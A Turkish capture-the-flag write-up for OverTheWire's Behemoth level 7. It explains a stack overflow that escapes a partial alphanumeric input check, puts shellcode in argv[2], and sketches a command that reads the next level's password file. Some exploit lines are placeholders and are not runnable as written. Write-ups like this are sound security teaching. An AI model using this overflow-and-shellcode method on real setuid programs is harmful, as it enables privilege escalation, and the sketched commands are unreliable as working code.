# OverTheWire — Behemoth Level 7 → 8  [SON SEVİYE]

> Hedef: `behemoth7`'den `behemoth8` şifresi. Sonuç: **`**********`** (gizlendi) — **Behemoth bitti!**
> Teknik: env-wipe + **sadece ilk 512 karakter** alfanümerik kontrolü → ötesindeki return
> adresini ez; shellcode `argv[2]`'de.

---

## 1. Bağlantı
```bash
ssh behemoth7@behemoth.labs.overthewire.org -p 2221
```

## 2. Zafiyet — disasm
```c
char buf[0x20c];                 // ebp-0x20c (524)
for(i=0; envp[i]; i++) memset(envp[i], 0, strlen(envp[i]));   // TÜM env'i sil
if (argc > 1) {
    p = argv[1]; count = 0;
    while (*p && count <= 0x1ff) {        // <<< sadece ilk 512 karakter
        count++;
        if (!(isalpha(*p) || isdigit(*p)))            // alfanümerik DEĞİLse
            { fprintf(stderr,"Non-alpha chars found..."); exit(1); }
        p++;
    }
}
strcpy(buf, argv[1]);            // overflow (argv[1] > 524 ise)
```

## 3. Kilit gözlemler
- **Karakter kontrolü sadece ilk 512 baytı kapsıyor** (`count <= 0x1ff` → 0..511). 512. bayttan
  sonrası **kontrol edilmiyor** → return adresi (offset 528) keyfi olabilir.
- **Offset:** `buf = ebp-0x20c` (524), saved EIP `ebp+4` → `0x20c + 4 = **528**`.
- **env silindi** → EGG kullanılamaz → shellcode'u **`argv[2]`**'ye koy (silinmez; narnia4 ruhu).

## 4. Exploit
```bash
cd /tmp
ARGV2=$(python3 -c 'b"\x90"*40000 + SHELLCODE_57')          # sled + setreuid/execve
ADDR=$(/tmp/bhm7_argvaddr1 "$(python3 -c 'b"A"*532')" "$ARGV2" | ...)   # argv[2] adresi (helper)
RET=$((0x$ADDR + 20000))
# argv[1] = "A"*528 (ilk 512 alfanümerik) + RET ; argv[2] = sled+shellcode
# env silindi -> shell'de PATH yok -> MUTLAK yol
python3 -c 'timed: "/usr/bin/id; /bin/cat /etc/behemoth_pass/behemoth8"' | \
  /behemoth/behemoth7 "$(python3 -c "b'A'*528 + pack('<I',RET)")" "$ARGV2"
```
> `'A'` (0x41) alfanümerik → ilk 512 kontrolünü geçer. Bayt 528..531 = RET (kontrol edilmez;
> null içermemeli — argv string truncation). Çıktı: `uid=13008(behemoth8)` → şifre.



## Dersler
| Konu | Not |
|------|-----|
| kısmi input kontrolü | sadece ilk 512 bayt denetlenir → return adresi (528) denetimsiz |
| offset 528 | `buf=ebp-0x20c` → 524+4 |
| env wipe → argv[2] | shellcode'u silinmeyen `argv[2]`'ye koy; env silinse de adres sabit |
| alfanümerik dolgu | ilk 512 = `'A'` (alpha) → kontrolü geçer |
| null-free ret | argv string null'da kesilir → ret baytları null içermesin |


